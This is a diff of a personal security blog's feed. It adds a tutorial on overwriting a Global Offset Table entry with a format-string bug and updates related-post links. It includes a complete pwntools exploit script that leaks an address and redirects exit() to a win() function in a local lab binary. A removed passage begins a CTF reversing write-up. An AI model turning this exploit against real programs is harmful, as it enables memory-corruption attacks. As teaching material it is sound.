+&lt;p&gt;The form for the input that will modify the GOT address for the vulnerable program is &lt;code class=&quot;highlighter-rouge&quot;&gt;AA&amp;lt;memory address&amp;gt;%&amp;lt;number&amp;gt;p%8$n&lt;/code&gt;. Some arbitrary number of spaces are printed out using &lt;code class=&quot;highlighter-rouge&quot;&gt;%&amp;lt;number&amp;gt;p&lt;/code&gt; in order to control the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt;. Since &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;memory address&amp;gt;&lt;/code&gt; should be the eighth value on the stack, doing &lt;code class=&quot;highlighter-rouge&quot;&gt;%8$n&lt;/code&gt; will replace the value at &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;memory address&amp;gt;&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;number&amp;gt;+6&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This input will be used twice: Once to write out the low-end bytes of the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; to the low-end bytes of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@got.plt&lt;/code&gt;, and another time to write out the high-end bytes of the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; to the high-end bytes of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@got.plt&lt;/code&gt;. Below is the entire exploit written out in Python. The value of &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;number&amp;gt;&lt;/code&gt; will be either the low-end bytes of the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; or the high-end bytes of the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, and it will be in base 10 since &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; requires a base 10 integer for the format string to work.&lt;/p&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;memory address&amp;gt;&lt;/code&gt; is four bytes, and there are another two bytes of A’s in the beginning, the program will print six bytes before it reaches &lt;code class=&quot;highlighter-rouge&quot;&gt;%&amp;lt;number&amp;gt;p&lt;/code&gt;. This means that six should be subtracted from number in order to have the exact address be printed out.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Create a new process
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Calculate the address of the GOT entry for exit()
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_got_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2e0b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exit_got_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leaked_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2e0d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Find the address of win()
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Convert the jump address into two base 10 integers
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000ffff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win_addr&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;win_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff0000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;win_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;win_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;win_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_addr_low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;win_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_addr_high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Trigger the GOT overflow
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_got_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win_addr_low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_got_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win_addr_high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;quit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Extra resources:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of&lt;/li&gt;
+  &lt;li&gt;https://cs155.stanford.edu/papers/formatstring-1.2.pdf&lt;/li&gt;
+  &lt;li&gt;https://www.ret2rop.com/2018/10/format-strings-got-overwrite-remote.html&lt;/li&gt;
+  &lt;li&gt;https://ctf101.org/binary-exploitation/relocation-read-only/&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;section class=&quot;related&quot;&gt;
+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
+          Creating a Basic Heap Allocator
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">The Global Offset Table (GOT) is a table of memory addresses, and the location of the GOT is always known at runtime. Typically, the GOT is used to store the address of various functions in libraries that are loaded into the program. Because of PIE, libraries will be relocated at runtime, so the only way for a running process to know the location of a certain library function is by looking it up inside of the GOT.</summary></entry><entry><title type="html">Creating a Basic Heap Allocator</title><link href="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html" rel="alternate" type="text/html" title="Creating a Basic Heap Allocator" /><published>2020-12-30T00:00:00-05:00</published><updated>2020-12-30T00:00:00-05:00</updated><id>http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator</id><content type="html" xml:base="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html">&lt;p&gt;The heap is an important segment of memory that grows upwards, towards the stack. This section of memory is used by computers to dynamically allocate memory to store whatever data they need for their programs to work. Heap allocators are used by programs in order to allot and keep track of chunks of memory that are being used inside of the heap. Modern operating systems use efficient and effective heap allocators in their systems, but this blog post will just be going over how a very basic heap allocator can be constructed in C.&lt;/p&gt;
 
 &lt;p&gt;Four functions will be implemented in this basic heap allocator:&lt;/p&gt;
 &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Allocates memory on the heap&lt;/span&gt;
@@ -601,6 +896,12 @@ Freeing buffer 2.
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
         &lt;/a&gt;
@@ -609,12 +910,6 @@ Freeing buffer 2.
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
-          Simple Heap Buffer Overflow
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -861,6 +1156,12 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -869,12 +1170,6 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
-          Simple Heap Buffer Overflow
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1289,6 +1584,12 @@ Please enter a number 1-4 to continue...
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -1297,12 +1598,6 @@ Please enter a number 1-4 to continue...
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
-          Simple Heap Buffer Overflow
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1499,6 +1794,12 @@ flag{insert_flag_here}
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -1507,12 +1808,6 @@ flag{insert_flag_here}
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1849,6 +2144,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -1857,12 +2158,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2013,6 +2308,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -2021,12 +2322,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2387,6 +2682,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -2395,12 +2696,6 @@ void ReadMemory(char *addr_hex, int n) {
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2595,6 +2890,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
           Creating a Basic Heap Allocator
         &lt;/a&gt;
@@ -2603,12 +2904,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
           Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -2654,47 +2949,10 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
-          Creating a Basic Heap Allocator
+        &lt;a href=&quot;/2021/01/03/got-overwrite-using-format-strings.html&quot;&gt;
+          GOT Overwrite Using Format Strings
         &lt;/a&gt;
       &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
-          Defeating ASLR via Memory Leak
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I am going to show you how I reverse engineered this binary and cracked the password. First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”</summary></entry><entry><title type="html">Reversing the buildString CTF challenge</title><link href="http://localhost:4000/2020/02/22/reversing-buildString-program.html" rel="alternate" type="text/html" title="Reversing the buildString CTF challenge" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/22/reversing-buildString-program</id><content type="html" xml:base="http://localhost:4000/2020/02/22/reversing-buildString-program.html">&lt;p&gt;Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called &lt;a href=&quot;../../../assets/other/2020-2-22-reversing-buildString-program/buildString&quot;&gt;buildString&lt;/a&gt;, and upon executing the file, I was greeted with the following output.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I used r2ghidra to decompile the main function, and it is clear that there is a lot going on here.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Essentially, the program is trying to generate a string using a strange algorithm that obfuscates what the string is. It took longer then I want to admit to figure out what I was supposed to do, but I eventually found out that the most important part to reversing this binary lies in the end of the main function, where another function called finalAssembly() is being called.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main_end.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I set a breakpoint at this function and took a look around. There are two function calls at the very beginning that are, presumably, being used to generate the string. I stepped over the two function calls and printed out the value of rdi, which happened to be “ZmxhZ3tFQHp5X1AzM3p5X2xlbW9uc3EzM3p5fQ==”.&lt;/p&gt;
-
